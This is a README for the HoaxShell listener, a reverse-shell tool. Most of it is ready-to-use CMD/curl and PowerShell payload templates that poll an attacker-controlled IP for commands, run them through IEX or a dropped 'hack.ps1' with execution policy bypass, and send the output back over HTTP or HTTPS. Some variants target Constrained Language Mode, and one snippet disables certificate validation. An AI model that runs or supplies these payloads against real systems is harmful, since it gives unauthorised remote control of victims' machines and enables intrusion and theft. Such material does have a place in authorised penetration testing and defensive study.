# HoaxShell Listener
[![Python](https://img.shields.io/badge/Python-%E2%89%A5%203.6-yellow.svg)](https://www.python.org/) 
<img src="https://img.shields.io/badge/PowerShell-%E2%89%A5%20v3.0-blue">
<img height="20px" src="https://img.shields.io/badge/Windows%20cmd-%234D4D4D.svg?style=for-the-badge&logo=windows-terminal&logoColor=white">
<img src="https://img.shields.io/badge/Developed%20on-kali%20linux-blueviolet">
<img src="https://img.shields.io/badge/Maintained%3F-Yes-96c40f">  

## Purpose
A standalone version of HoaxShell's listener, mainly created for integration with [RevShells.com](https://revshells.com).  

## Installation
```
pip3 install -r requirements.txt
```
**Important**: The `gnureadline` module is not meant for Windows and it will naturally cause an error if you try to install with pip. Remove `gnureadline` from the requirements.txt to install on Windows.

## Usage
The standalone listener does not include payload generation functions. It is desighed to work in a simple manner with the only required argument being the payload type to expect (payload types and templates listed below).  

You can run the listener by executing `hoaxshell-listener.py` or directly invoking it from the project's repository:
```
# Execute from file
python3 hoaxshell-listener.py -t <payload-type>

# Invoke from repository
python3 -c "$(curl -s https://raw.githubusercontent.com/t3l3machus/hoaxshell/main/revshells/hoaxshell-listener.py)" -t <payload type> -p <port> [-c /your/cert.pem -k /your/key.pem>] 
```

The listener is designed to accept any incoming connection bearing a session id in the form of `eb6a44aa-8acc1e56-629ea455`.  
You can keep the session id's included in the templates or alter them to different values.

## Payload Templates
1. Start the listener with the `--type [-t]` set to one of the available payload types below:  
`cmd-curl | ps-iex | ps-iex-cm | ps-outfile | ps-outfile-cm`
2. Grab the equivalent template and adjust the IP and PORT values. if you change the default port 8080/443 you need to parse it to the listener with `-p`.
3. Execute payload on the target machine.

### http payloads

#### cmd-curl
A brand new payload written in pure Windows CMD that utilizes cURL.
```
@echo off&cmd /V:ON /C "SET ip=192.168.0.71:8080&&SET sid="Authorization: eb6a44aa-8acc1e56-629ea455"&&SET protocol=http://&&curl !protocol!!ip!/eb6a44aa -H !sid! > NUL && for /L %i in (0) do (curl -s !protocol!!ip!/8acc1e56 -H !sid! > !temp!\cmd.bat & type !temp!\cmd.bat | findstr None > NUL & if errorlevel 1 ((!temp!\cmd.bat > !tmp!\out.txt 2>&1) & curl !protocol!!ip!/629ea455 -X POST -H !sid! --data-binary @!temp!\out.txt > NUL)) & timeout 1" > NUL
```

#### ps-iex
PowerShell payload that utilizes IEX.
```
$s='192.168.0.71:8080';$i='14f30f27-650c00d7-fef40df7';$p='http://';$v=IRM -UseBasicParsing -Uri $p$s/14f30f27 -Headers @{"Authorization"=$i};while ($true){$c=(IRM -UseBasicParsing -Uri $p$s/650c00d7 -Headers @{"Authorization"=$i});if ($c -ne 'None') {$r=IEX $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=IRM -Uri $p$s/fef40df7 -Method POST -Headers @{"Authorization"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}
```

#### ps-iex-cm
Same as `ps-iex` but will also work if the target system is running on PowerShell Constraint Language Mode.
```
$s='192.168.0.71:8080';$i='bf5e666f-5498a73c-34007c82';$p='http://';$v=IRM -UseBasicParsing -Uri $p$s/bf5e666f -Headers @{"Authorization"=$i};while ($true){$c=(IRM -UseBasicParsing -Uri $p$s/5498a73c -Headers @{"Authorization"=$i});if ($c -ne 'None') {$r=IEX $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=IRM -Uri $p$s/34007c82 -Method POST -Headers @{"Authorization"=$i} -Body ($e+$r)} sleep 0.8}
```

#### ps-outfile
PowerShell payload that writes and executes commands from disc.
```
$s='192.168.0.71:8080';$i='add29918-6263f3e6-2f810c1e';$p='http://';$f="C:\Users\$env:USERNAME\.local\hack.ps1";$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s/add29918 -Headers @{"Authorization"=$i};while ($true){$c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s/6263f3e6 -Headers @{"Authorization"=$i});if ($c -eq 'exit') {del $f;exit} elseif ($c -ne 'None') {echo "$c" | out-file -filepath $f;$r=powershell -ep bypass $f -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-RestMethod -Uri $p$s/2f810c1e -Method POST -Headers @{"Authorization"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}
```

#### ps-outfile-cm
Same as `ps-outfile` but will also work if the target system is running on PowerShell Constraint Language Mode.
```
$s='192.168.0.71:8080';$i='e030d4f6-9393dc2a-dd9e00a7';$p='http://';$f="C:\Users\$env:USERNAME\.local\hack.ps1";$v=IRM -UseBasicParsing -Uri $p$s/e030d4f6 -Headers @{"Authorization"=$i};while ($true){$c=(IRM -UseBasicParsing -Uri $p$s/9393dc2a -Headers @{"Authorization"=$i}); if ($c -eq 'exit') {del $f;exit} elseif ($c -ne 'None') {echo "$c" | out-file -filepath $f;$r=powershell -ep bypass $f -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=IRM -Uri $p$s/dd9e00a7 -Method POST -Headers @{"Authorization"=$i} -Body ($e+$r)} sleep 0.8}
```

### https Payloads
You can parse certificate and private-key .pem files to the listener with `-c` and `-k` to start it via https.  
To generate self-signed certificates you can use: `openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365`  
Find below the payload templates adjusted to use https.

**For PowerShell payloads**: If you don't supply a trusted certificate to the listener, append this block at the beginning of the payload to disable certificate validation:
```
add-type @"
using System.Net;using System.Security.Cryptography.X509Certificates;                                  
public class TrustAllCertsPolicy : ICertificatePolicy {public bool CheckValidationResult(              
ServicePoint srvPoint, X509Certificate certificate,WebRequest request, int certificateProblem) {return true;}}
"@                                                                                                     
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy
```
#### cmd-curl
```
@echo off&cmd /V:ON /C "SET ip=192.168.0.71:443&&SET sid="Authorization: eb6a44aa-8acc1e56-629ea455"&&SET protocol=https://&&curl -fs -k !protocol!!ip!/eb6a44aa -H !sid! > NUL & for /L %i in (0) do (curl -fs -k !protocol!!ip!/8acc1e56 -H !sid! > !temp!\cmd.bat & type !temp!\cmd.bat | findstr None > NUL & if errorlevel 1 ((!temp!\cmd.bat > !tmp!\out.txt 2>&1) & curl -fs -k !protocol!!ip!/629ea455 -X POST -H !sid! --data-binary @!temp!\out.txt > NUL)) & timeout 1" > NUL
```

#### ps-iex
```
$s='192.168.0.71:443';$i='1cdbb583-f96894ff-f99b8edc';$p='https://';$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s/1cdbb583 -Headers @{"Authorization"=$i};while ($true){$c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s/f96894ff -Headers @{"Authorization"=$i});if ($c -ne 'None') {$r=iex $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-RestMethod -Uri $p$s/f99b8edc -Method POST -Headers @{"Authorization"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}
```

#### ps-iex-cm
```
$s='192.168.0.71:443';$i='11e6bc4b-fefb1eab-68a9612e';$p='https://';$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s/11e6bc4b -Headers @{"Authorization"=$i};while ($true){$c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s/fefb1eab -Headers @{"Authorization"=$i});if ($c -ne 'None') {$r=iex $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-RestMethod -Uri $p$s/68a9612e -Method POST -Headers @{"Authorization"=$i} -Body ($e+$r)} sleep 0.8}
```

#### ps-outfile
```                                                                                                                    
$s='192.168.0.71:443';$i='add29918-6263f3e6-2f810c1e';$p='https://';$f="C:\Users\$env:USERNAME\.local\hack.ps1";$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s/add29918 -Headers @{"Authorization"=$i};while ($true){$c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s/6263f3e6 -Headers @{"Authorization"=$i});if ($c -eq 'exit') {del $f;exit} elseif ($c -ne 'None') {echo "$c" | out-file -filepath $f;$r=powershell -ep bypass $f -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-RestMethod -Uri $p$s/2f810c1e -Method POST -Headers @{"Authorization"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}
```

#### ps-outfile-cm
```
$s='192.168.0.71:443';$i='e030d4f6-9393dc2a-dd9e00a7';$p='https://';$f="C:\Users\$env:USERNAME\.local\hack.ps1";$v=IRM -UseBasicParsing -Uri $p$s/e030d4f6 -Headers @{"Authorization"=$i};while ($true){$c=(IRM -UseBasicParsing -Uri $p$s/9393dc2a -Headers @{"Authorization"=$i}); if ($c -eq 'exit') {del $f;exit} elseif ($c -ne 'None') {echo "$c" | out-file -filepath $f;$r=powershell -ep bypass $f -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=IRM -Uri $p$s/dd9e00a7 -Method POST -Headers @{"Authorization"=$i} -Body ($e+$r)} sleep 0.8}
```
